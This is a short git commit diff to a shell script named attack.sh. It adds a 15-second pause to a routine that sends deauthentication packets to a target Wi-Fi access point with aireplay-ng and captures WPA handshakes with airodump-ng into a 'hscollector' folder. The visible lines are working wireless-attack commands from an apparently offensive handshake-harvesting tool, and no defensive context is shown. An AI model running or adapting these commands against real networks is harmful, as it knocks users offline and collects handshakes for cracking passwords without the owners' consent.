e0ad5f37ce317479397be25ffe8f6b4698399b9b
rinamuka <58566654+rinamuka@users.noreply.github.com>
2021-08-27 09:31:03 +0300

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -119,6 +119,7 @@ active() {
           aireplay-ng -a $BSSID -0 5 $interface &
           airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &
           airodumpPID=`echo $!`
+          sleep 15
           echo "airodumpPID:"$airodumpPID
           kill -9 $airodumpPID
           checkHandshakes
